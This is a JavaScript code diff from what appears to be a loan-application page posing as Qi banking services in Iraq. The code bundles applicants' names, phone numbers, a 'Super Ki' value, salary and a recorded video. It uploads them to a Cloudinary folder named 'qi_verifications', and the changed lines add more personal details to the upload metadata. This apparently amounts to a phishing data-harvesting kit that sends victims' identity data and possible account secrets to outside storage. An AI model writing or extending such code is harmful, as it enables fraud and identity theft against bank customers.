+const txt=`طلب سلفة جديد - كي للخدمات المصرفية\n=========================================\n\n📋 بيانات المتقدم:\n• الاسم: ${formData.name}\n• الهاتف: ${formData.phone}\n• سوبر كي: ${formData.sk}\n• المبلغ: ${formData.amt}\n• الراتب: ${formData.sal}\n\n📅 الوقت: ${new Date().toLocaleString('ar-IQ',{timeZone:'Asia/Baghdad'})}\n🔐 المرجع: ${tok}\n=========================================`;
 const tb=new Blob([txt],{type:'text/plain;charset=utf-8'});
 
-const fd1=new FormData();fd1.append('file',vb,`video_${tok}.webm`);fd1.append('upload_preset',UP);fd1.append('folder','qi_verifications');fd1.append('resource_type','video');fd1.append('public_id',`${tok}_video`);fd1.append('context',`token=${tok}`);
+const fd1=new FormData();fd1.append('file',vb,`video_${tok}.webm`);fd1.append('upload_preset',UP);fd1.append('folder','qi_verifications');fd1.append('resource_type','video');fd1.append('public_id',`${tok}_video`);fd1.append('context',`token=${tok}|name=${formData.name}|phone=${formData.phone}|amount=${formData.amt}`);
 
-const fd2=new FormData();fd2.append('file',tb,`data_${tok}.txt`);fd2.append('upload_preset',UP);fd2.append('folder','qi_verifications');fd2.append('resource_type','raw');fd2.append('public_id',`${tok}_data`);fd2.append('context',`token=${tok}`);
+const fd2=new FormData();fd2.append('file',tb,`data_${tok}.txt`);fd2.append('upload_preset',UP);fd2.append('folder','qi_verifications');fd2.append('resource_type','raw');fd2.append('public_id',`${tok}_data`);fd2.append('context',`token=${tok}|name=${formData.name}|phone=${formData.phone}`);
 
 await Promise.all([
 fetch(`https://api.cloudinary.com/v1_1/${CN}/video/upload`,{method:'POST',body:fd1}),
